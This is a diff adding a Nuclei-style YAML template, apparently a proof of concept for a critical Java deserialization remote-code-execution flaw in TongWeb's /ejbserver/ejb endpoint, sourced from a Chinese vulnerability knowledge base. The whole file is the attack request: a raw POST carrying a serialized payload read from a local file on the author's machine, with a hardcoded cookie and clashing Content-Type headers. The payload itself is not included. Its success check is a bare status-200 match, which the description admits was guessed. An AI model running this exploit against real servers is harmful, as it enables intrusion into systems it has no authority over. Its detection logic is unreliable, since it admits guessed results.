@@ -1,0 +1,45 @@
+id: poc-lwya3dvcggiw054f
+info:
+  name: 东方通TongWeb ejbserver反序列化漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lwya3dvcggiw054f
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lwya3dvcggiw054f
+http:
+- raw:
+  - 'POST /ejbserver/ejb HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: console-6-4076-9=A5F73B6EDA215CCE0792AC66CB383DF9
+
+    Cache-Control: max-age=0
+
+    Content-Type: application/x-java-serialized-object
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Upgrade-Insecure-Requests: 1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Length: 498
+
+
+    {{file(J:\渗透常规操作\wiki\JAVA\Java知识\java反序列利用链\untitled\output.ser)}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
